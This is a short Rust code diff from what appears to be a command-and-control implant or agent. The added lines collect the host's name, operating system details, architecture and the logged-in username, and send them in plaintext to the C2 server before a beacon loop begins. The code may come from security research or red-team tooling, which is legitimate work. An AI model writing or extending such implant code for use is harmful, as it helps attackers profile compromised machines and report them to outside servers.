@@ -113,6 +113,23 @@ async fn run_agent(
             Ok(()) => {
                 info!("🔗 Connected to C2 server");
 
+                // Send plaintext registration with system info
+                let username = std::env::var("USERNAME")
+                    .or_else(|_| std::env::var("USER"))
+                    .unwrap_or_else(|_| "unknown".to_string());
+                let reg_msg = serde_json::json!({
+                    "msg_type": "REGISTER",
+                    "agent_id": sys_info.agent_id,
+                    "hostname": sys_info.hostname,
+                    "os": sys_info.os,
+                    "os_version": sys_info.os_version,
+                    "architecture": sys_info.architecture,
+                    "user": username,
+                });
+                if let Err(e) = communicator.send_raw(&reg_msg.to_string()).await {
+                    error!("Registration failed: {}", e);
+                }
+
                 // Main command loop
                 'beacon: loop {
                     let beacon = BeaconPayload {
